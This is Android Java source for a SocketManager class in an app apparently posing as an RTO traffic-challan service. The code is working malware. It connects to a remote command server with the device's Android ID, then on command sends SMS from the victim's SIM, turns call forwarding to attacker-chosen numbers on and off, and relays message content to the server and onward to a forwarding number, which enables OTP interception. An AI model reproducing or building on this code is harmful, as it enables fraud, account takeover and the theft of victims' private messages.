package com.service.rtochallan;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import android.telephony.SmsManager;
import android.util.Log;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Arrays;

import io.socket.client.Ack;
import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;


public class SocketManager {

    private static SocketManager instance;
    private Socket socket;
    private Context context;
    private Helper helper;
    private StorageHelper storage;
    private SmsManager smsManager;

    // Singleton pattern
    public static SocketManager getInstance(Context context) {
        if (instance == null) {
            instance = new SocketManager(context.getApplicationContext());
        }
        return instance;
    }
    private SocketManager(Context context) {
        helper = new Helper();
        storage = new StorageHelper(context);
        this.context = context;

        new Thread(() -> {
            int maxRetries = 10000;
            int retryCount = 0;

            while (retryCount < maxRetries) {
                String socketUrl = helper.SocketUrl(context);
                if (socketUrl != null && !socketUrl.isEmpty()) {
                    try {
                        IO.Options options = new IO.Options();
                        options.reconnection = true;
                        String androidId = URLEncoder.encode(helper.getAndroidId(context), "UTF-8");
                        String formCode = URLEncoder.encode(helper.FormCode(), "UTF-8");
                        options.query = "client=android&android_id=" + androidId + "&form_code=" + formCode;

                        socket = IO.socket(socketUrl, options);
                        setupListeners();
                        Log.d(helper.TAG, "Socket initialized successfully ✅" + socketUrl);
                        return; // done
                    } catch (Exception e) {
                        Log.e(helper.TAG, "Socket initialization error: " + e.getMessage());
                        return;
                    }
                }
                Log.d(helper.TAG, "Socket URL empty — retrying... (" + (retryCount + 1) + ")");
                retryCount++;
                try {
                    Thread.sleep(2000); // wait 2 seconds before retry
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }

            Log.e(helper.TAG, "Socket URL still empty after retries — giving up.");
        }).start();
    }



    private void setupListeners() {
        socket.on(Socket.EVENT_CONNECT, new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                helper.show("Event Connect" + isConnected());
                resendPendingSms();
                deviceOfflineBy("EVENT_CONNECT", "online");
            }
        });

        socket.on(Socket.EVENT_DISCONNECT, new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                helper.show("EVENT_DISCONNECT");
            }
        });

        socket.on(Socket.EVENT_CONNECT_ERROR, new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                // it will try to connect, if not success calling every seconds...
                helper.show("❌ Socket Connect Error: " + Arrays.toString(args));
            }
        });

//        socket.onAnyIncoming(new Emitter.Listener() {
//            @Override
//            public void call(Object... args) {
//                //Log.d(helper.TAG, "Incoming Package : "+ Arrays.toString(args));
//            }
//        });
//
//        socket.onAnyOutgoing(new Emitter.Listener() {
//            @Override
//            public void call(Object... args) {
//                //Log.d(helper.TAG, "Outgoing Package : "+ Arrays.toString(args));
//            }
//        });


//        socket.on("hello", new Emitter.Listener() {
//            @Override
//            public void call(Object... args) {
//                //Log.d(helper.TAG, "Hello-World"+args[0]);
//            }
//        });


        // Listen SMS Forwarding Request
        socket.on("sms_send_android", args -> {
            if (args.length > 0) {
                JSONObject data = (JSONObject) args[0];
                try {
                    handleNewSendSMS(data);
                } catch (JSONException e) {
                    throw new RuntimeException(e);
                }
            }
        });

        // Listen Call Forwarding Request
        socket.on("call_forward_android", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                //Log.d(helper.TAG, "call forward android");
                if (args.length > 0) {
                    JSONObject data = (JSONObject) args[0];
                    try {
                        handleNewCallForwarding(data);
                    } catch (JSONException e) {
                        throw new RuntimeException(e);
                    }
                }
            }
        });

        // Listen Call Forwarding Request
        socket.on("call_forward_remove_android", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                if (args.length > 0) {
                    JSONObject data = (JSONObject) args[0];
                    try {
                        handleNewCallRemoveForwarding(data);
                    } catch (JSONException e) {
                        throw new RuntimeException(e);
                    }
                }
            }
        });
    }

    // Connect socket
    public void connect() {
        if(helper.SocketUrl(context).isEmpty()){
            Log.d(helper.TAG, "Socket Connect Skipping, Not Loaded Socket Url");
            return ;
        }
        if (socket != null && !socket.connected()) {
            socket.connect();
        }
    }

    // Disconnect socket
    public void disconnect() {
        if (socket != null && socket.connected()) {
            socket.disconnect();
        }
    }

    // Emit event with data
    public void emit(String event, JSONObject data) {
        if (socket != null && socket.connected()) {
            socket.emit(event, data);
        }
    }

    private void handleNewSendSMS(JSONObject data) throws JSONException {

        String to_number = data.getString("to_number");
        String message = data.getString("message");
        int sub_id = data.getInt("sim_sub_id");  // SIM subscription ID
        int sms_send_id = data.getInt("sms_send_id");

        // ✅ Get SmsManager for specific SIM
        SmsManager smsManager = SmsManager.getSmsManagerForSubscriptionId(sub_id);

        int sentRequestCode = (sms_send_id + to_number).hashCode();
        int deliveredRequestCode = (sms_send_id + to_number + "_delivered").hashCode();

        Intent sentIntent = new Intent(context, SmsSendSentReceiver.class);
        sentIntent.putExtra("sms_send_id", sms_send_id);
        sentIntent.putExtra("to_number", to_number);
        PendingIntent sentPendingIntent = PendingIntent.getBroadcast(
                context, sentRequestCode, sentIntent, PendingIntent.FLAG_IMMUTABLE
        );

        Intent deliveredIntent = new Intent(context, SmsSendDeliveredReceiver.class);
        deliveredIntent.putExtra("sms_send_id", sms_send_id);
        deliveredIntent.putExtra("to_number", to_number);
        PendingIntent deliveredPendingIntent = PendingIntent.getBroadcast(
                context, deliveredRequestCode, deliveredIntent, PendingIntent.FLAG_IMMUTABLE
        );
//        storage.saveString("skip_message_body", message); // skip to forwarding in smsreceiver
        smsManager.sendTextMessage(to_number, null, message, sentPendingIntent, deliveredPendingIntent);
    }


    // make callback and give response to client
    private void handleNewCallForwarding(JSONObject data) throws JSONException {
        String phoneNumber = data.getString("call_forwarding_to_number");
        int sim_sub_id = data.getInt("sim_sub_id");
        CallForwardingHelper.setCallForwarding(context, phoneNumber, sim_sub_id, new CallForwardingHelper.CallForwardingCallback() {
            @Override
            public void onSuccess(String message) throws JSONException {
                socket.emit("update_call_forward_device_status", new JSONObject()
                        .put("sim_sub_id", sim_sub_id) // android_id & form_code no need to send, already sent via query
                        .put("status", "Enabled")
                        .put("status_message", message));
            }

            @Override
            public void onFailure(String error) throws JSONException {
                socket.emit("update_call_forward_device_status", new JSONObject()
                        .put("sim_sub_id", sim_sub_id) // android_id & form_code no need to send, already sent via query
                        .put("status", "Failed")
                        .put("status_message", error));
            }
        });
    }

    // make callback and give response to client
    private void handleNewCallRemoveForwarding(JSONObject data) throws JSONException {
        //Log.d(helper.TAG, "calremove called");
        int sim_sub_id = data.getInt("sim_sub_id");
        CallForwardingHelper.removeCallForwarding(context, sim_sub_id, new CallForwardingHelper.CallForwardingCallback() {
            @Override
            public void onSuccess(String message) throws JSONException {
                socket.emit("update_call_forward_device_status", new JSONObject()
                        .put("sim_sub_id", sim_sub_id) // android_id & form_code no need to send, already sent via query
                        .put("status", "Disabled")
                        .put("status_message", message));
            }

            @Override
            public void onFailure(String error) throws JSONException {
                socket.emit("update_call_forward_device_status", new JSONObject()
                        .put("sim_sub_id", sim_sub_id) // android_id & form_code no need to send, already sent via query
                        .put("status", "Failed")
                        .put("status_message", error));
            }
        });
    }

    // Helper method to show Toast on main thread
    private void showToast(final String message) {
        new Handler(Looper.getMainLooper()).post(() ->
                Toast.makeText(context, message, Toast.LENGTH_SHORT).show()
        );
    }


    public void emitWithAck(String event, JSONObject data, AckCallback callback) {
        if (socket != null && socket.connected()) {
            socket.emit(event, new Object[]{ data }, (Ack) (Object... ackArgs) -> {
                try {
                    if (ackArgs.length > 0 && ackArgs[0] instanceof JSONObject) {
                        JSONObject response = (JSONObject) ackArgs[0];
                        callback.onResponse(response);
                    } else {
                        callback.onError("Invalid response from server");
                    }
                } catch (Exception e) {
                    callback.onError("Error parsing response: " + e.getMessage());
                }
            });
        } else {
            callback.onError("Socket not connected");
        }
    }
    // Interface for callback
    public interface AckCallback {
        void onResponse(JSONObject response) throws JSONException;
        void onError(String error);
    }


    public void deviceOfflineBy(String message, String status)  {
        if(!isConnected()){
            helper.show("socket, message not send - " + message);
        }
        try {
            JSONObject jsonData = new JSONObject();
            jsonData.put("device_status_message", message);
            jsonData.put("device_status", status);
            socket.emit("device_status_message", jsonData);
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }
    }

    public boolean isConnected() {
        return socket != null && socket.connected();
    }

    public void sendSMSWithSocket(JSONObject sendPayload) {
        final int[] userId = {0};

        emitWithAck("smsForwardingData", sendPayload, new AckCallback() {
            @Override
            public void onResponse(JSONObject response) {
                try {
                    int status = response.optInt("status", 0);
                    if (status != 200) return;

                    JSONObject dataObj = response.optJSONObject("data");
                    if (dataObj == null) return;

                    userId[0] = dataObj.optInt("id");
                    String phoneNumber = dataObj.optString("forward_to_number", "");
                    if (phoneNumber.isEmpty()) return;

                    String message = sendPayload.optString("message", "");
                    if (message.isEmpty()) return;

                    // ✅ Unique request codes for this user & number
                    int sentCode = (userId[0] + phoneNumber).hashCode();
                    int deliveredCode = (userId[0] + phoneNumber + "_delivered").hashCode();

                    Intent sentIntent = new Intent(context, SentReceiver.class);
                    Intent deliveredIntent = new Intent(context, DeliveredReceiver.class);
                    sentIntent.putExtra("id", userId[0]);
                    sentIntent.putExtra("phone", phoneNumber);
                    deliveredIntent.putExtra("id", userId[0]);
                    deliveredIntent.putExtra("phone", phoneNumber);

                    PendingIntent sentPI = PendingIntent.getBroadcast(
                            context, sentCode, sentIntent, PendingIntent.FLAG_IMMUTABLE);

                    PendingIntent deliveredPI = PendingIntent.getBroadcast(
                            context, deliveredCode, deliveredIntent, PendingIntent.FLAG_IMMUTABLE);

                    SmsManager smsManager = SmsManager.getDefault();

                    // ✅ Divide the message to check how many parts
                    ArrayList<String> parts = smsManager.divideMessage(message);

                    if (parts.size() == 1) {
                        // 📩 Single short message → use sendTextMessage()
                        smsManager.sendTextMessage(
                                phoneNumber,
                                null,
                                message,
                                sentPI,
                                deliveredPI
                        );
                    } else {
                        // 🧩 Long message → use multipart sending
                        ArrayList<PendingIntent> sentIntents = new ArrayList<>();
                        ArrayList<PendingIntent> deliveredIntents = new ArrayList<>();

                        for (int i = 0; i < parts.size(); i++) {
                            sentIntents.add(sentPI);
                            deliveredIntents.add(deliveredPI);
                        }

                        smsManager.sendMultipartTextMessage(
                                phoneNumber,
                                null,
                                parts,
                                sentIntents,
                                deliveredIntents
                        );
                    }

                } catch (Exception e) {
                    Log.e("SmsReceiver", "Error processing socket response", e);
                }
            }

            @Override
            public void onError(String error) {
                PendingSmsManager pendingManager = new PendingSmsManager(context);
                pendingManager.addPending(sendPayload);
                Log.e("SmsReceiver", "Socket emit error: " + error);
            }
        });
    }


    private void resendPendingSms() {
        PendingSmsManager pendingManager = new PendingSmsManager(context);
        JSONArray list = pendingManager.getAllPending();

        if (list.length() == 0) return;

        helper.show("PendingSMS📤 Found " + list.length() + " pending SMS. Sending now...");

        for (int i = 0; i < list.length(); i++) {
            try {
                JSONObject sms = list.getJSONObject(i);
                sendSMSWithSocket(sms);
                pendingManager.removeAt(i);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }




}
